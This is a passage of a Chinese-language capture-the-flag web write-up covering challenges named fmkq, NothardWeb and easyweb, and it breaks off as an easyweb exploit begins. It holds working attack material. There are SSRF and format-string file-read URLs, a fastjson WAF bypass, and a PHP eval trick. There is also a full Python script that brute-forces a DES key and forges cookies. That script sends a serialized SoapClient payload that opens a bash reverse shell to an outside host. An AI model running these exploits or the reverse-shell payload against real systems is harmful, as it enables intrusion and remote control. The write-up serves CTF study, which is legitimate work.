</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ch</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;\\&#39;</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                   </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>hasSpecial</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                   </span><span class=c1>// ...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                     </span><span class=k>case</span><span class=w> </span><span class=sc>&#39;x&#39;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=kt>char</span><span class=w> </span><span class=n>x1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=kt>char</span><span class=w> </span><span class=n>x2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=kt>boolean</span><span class=w> </span><span class=n>hex1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>x1</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=sc>&#39;0&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>x1</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=sc>&#39;9&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                   </span><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=n>x1</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=sc>&#39;a&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>x1</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=sc>&#39;f&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                   </span><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=n>x1</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=sc>&#39;A&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>x1</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=sc>&#39;F&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=kt>boolean</span><span class=w> </span><span class=n>hex2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>x2</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=sc>&#39;0&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>x2</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=sc>&#39;9&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                   </span><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=n>x2</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=sc>&#39;a&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>x2</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=sc>&#39;f&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                   </span><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=n>x2</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=sc>&#39;A&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>x2</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=sc>&#39;F&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>hex1</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>hex2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                               </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>JSONException</span><span class=p>(</span><span class=s>&#34;invalid escape character \\x&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>x1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>x2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=kt>char</span><span class=w> </span><span class=n>x_char</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>digits</span><span class=o>[</span><span class=n>x1</span><span class=o>]</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>16</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>digits</span><span class=o>[</span><span class=n>x2</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=n>putChar</span><span class=p>(</span><span class=n>x_char</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                           </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>//...</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>可以看到 fastjson 支持标准里面没有的表示方式. Lexer 实际会对 \x12 这种表示方式进行转义. 用着这种方式可以绕掉对 type 的拦截.<br>但是 prefix 仍然不行, 多次尝试发现可以利用 fastjson smartMatch 的特性, 在 prefix 前面加个 - 就可以绕过了, _ 却不行&mldr;, 这 waf 有点迷惑&mldr;.<br>之后就是常规套路, 不多讲了</p><h3 id=fmkq>fmkq</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://121.37.179.47:1101/?head=\&amp;url=http://127.0.0.1/&amp;begin=%s%
</span></span></code></pre></td></tr></table></div></div><p>就可以 ssrf, fuzz 出来 8080 有个服务. 根据 <code>/tmp/{file}</code> 发现是格式化字符串漏洞.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://121.37.179.47:1101/?head=\&amp;url=http://127.0.0.1:8080/read/file={file.__init__.__globals__[vip].__init__.__globals__}%26vipcode=0&amp;begin=%s%
</span></span></code></pre></td></tr></table></div></div><p>读到 vipcode 之后就可以随便读文件了. 但是把 flag 所在文件夹里面的 fl4g 给 ban 了<br>这里审计一下代码, 先访问一次根目录覆盖 current_folder_file
之后</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://121.37.179.47:1101/?head=\&amp;begin=%s%&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2Fread%2Ffile%3D{vipfile.__init__.__globals__[current_folder_file][21]}/flag%26vipcode%3DBWUTtnq6d8myKFvJ3wk1VfrecL5ZGQa4Cx9uNpoDHPEiOj7S
</span></span></code></pre></td></tr></table></div></div><p>就可以了</p><h3 id=nothardweb>NothardWeb</h3><p>生成的时候 & 0x5f5e0ff 了一下, 密钥空间有限, <code>2**19</code>, 爆破就行了<br>里面是个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cc&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cc</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cc&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$cc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>6</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>?cc=`$cc`;anything you want to execute;
就能绕过, 最里面 tomcat 用 PUT 方法那个 CVE 就能直接写 shell.</p><p>最后脚本如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>DES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.strxor</span> <span class=kn>import</span> <span class=n>strxor</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tqdm</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>quote</span><span class=p>,</span> <span class=n>unquote</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://121.37.161.79:2333/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=n>unquote</span><span class=p>(</span><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;hash&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>part</span> <span class=o>=</span> <span class=n>enc</span><span class=p>[</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>part</span><span class=p>[:</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=n>part</span><span class=p>[</span><span class=mi>8</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mask</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=mh>0x5f5e0ff</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>pos</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>seq</span><span class=p>,</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>mask</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pos</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>seq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>global</span> <span class=n>key</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>27</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>l2i</span><span class=p>(</span><span class=n>l</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>l</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>&lt;&lt;=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>^=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>padz</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pad</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span> <span class=o>+</span> <span class=nb>bytearray</span><span class=p>([(</span><span class=mi>8</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span><span class=p>)])</span> <span class=o>*</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=o>.</span><span class=n>tqdm</span><span class=p>(</span><span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=o>*</span><span class=p>[[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>]</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>19</span><span class=p>)])):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>seq</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span><span class=p>[</span><span class=n>pos</span><span class=p>[</span><span class=n>seq</span><span class=p>]]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>l2i</span><span class=p>(</span><span class=n>key</span><span class=p>)),</span> <span class=s1>&#39;ascii&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>+=</span> <span class=p>(</span><span class=n>t</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>t</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>t</span><span class=p>[:</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>des</span> <span class=o>=</span> <span class=n>DES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=n>DES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>des</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>strxor</span><span class=p>(</span><span class=n>iv</span><span class=p>,</span> <span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;;}</span><span class=se>\x06\x06\x06\x06\x06\x06</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>globals</span><span class=p>()[</span><span class=s1>&#39;key&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>padz</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>l2i</span><span class=p>(</span><span class=n>key</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())[:</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;O:4:&#34;User&#34;:1:{s:8:&#34;username&#34;;s:5:&#34;admin&#34;;}&#39;</span>
</span></span><span class=line><span class=cl><span class=n>digest</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>fake</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;85196940&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>des</span> <span class=o>=</span> <span class=n>DES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>DES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=o>=</span><span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>des</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=n>fake</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=p>[</span><span class=s1>&#39;hash&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>digest</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>quote</span><span class=p>(</span><span class=n>fake</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://121.37.161.79:2333/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=s1>&#39;O:10:&#34;SoapClient&#34;:4:{s:3:&#34;uri&#34;;s:5:&#34;rmbbb&#34;;s:8:&#34;location&#34;;s:124:&#34;http://10.10.1.12/index.php?cc=</span><span class=si>%60%</span><span class=s1>24cc</span><span class=si>%60%</span><span class=s1>3Bbash+-c+%22bash+-i+</span><span class=si>%3E</span><span class=s1>%26+</span><span class=si>%2F</span><span class=s1>dev</span><span class=si>%2F</span><span class=s1>tcp</span><span class=si>%2F</span><span class=s1>111.111.111.111</span><span class=si>%2F</span><span class=s1>19132+0</span><span class=si>%3E%261%</span><span class=s1>22%3B&#34;;s:15:&#34;_stream_context&#34;;i:0;s:13:&#34;_soap_version&#34;;i:1;}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>fake</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>digest</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>fake</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;85196940&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>des</span> <span class=o>=</span> <span class=n>DES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>DES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=o>=</span><span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>des</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=n>fake</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=p>[</span><span class=s1>&#39;hash&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>digest</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>cookies</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>quote</span><span class=p>(</span><span class=n>fake</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://121.37.161.79:2333/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=easyweb>easyweb</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>![](netdoc://xxxx)
</span></span></code></pre></td></tr></table></div></div><p>就能读文件, 但是发现有些不可见字符读出来是问号, 之后查看 lib 文件夹发现 commons-collections-3.1 + rmi 的 hint, 发现有个 MarkDown.class 里面是个 extends Remote 的interface, 函数签名不用反编译就能看出来, 刚好有个参数是 Object 的, 可以利用. 本地造一个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>services</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.rmi.Remote</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>interface</span> <span class=nc>MarkDown</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Remote</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=nf>parseDocument</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>就能调用 rmi 了,<br>exp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
